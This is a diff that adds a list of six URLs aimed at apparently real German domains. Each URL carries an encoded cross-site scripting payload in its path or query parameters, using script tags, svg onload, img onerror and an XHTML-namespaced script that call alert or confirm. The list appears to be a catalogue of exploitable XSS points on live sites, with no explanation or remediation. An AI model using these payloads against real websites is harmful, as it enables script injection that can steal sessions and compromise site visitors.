@@ -1,0 +1,6 @@
+http://decoy.toarx.de/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E
+http://deich.immeta.de/login/?uid="><img%20src="x"%20onerror="alert(%27XSS%27)">
+http://demo.kinderschutzbund-oh.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+http://deprecated.drinkware.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
+https://delmenhorst-suche.de/api/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://demo.kostenlos-onlineshop.de/?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
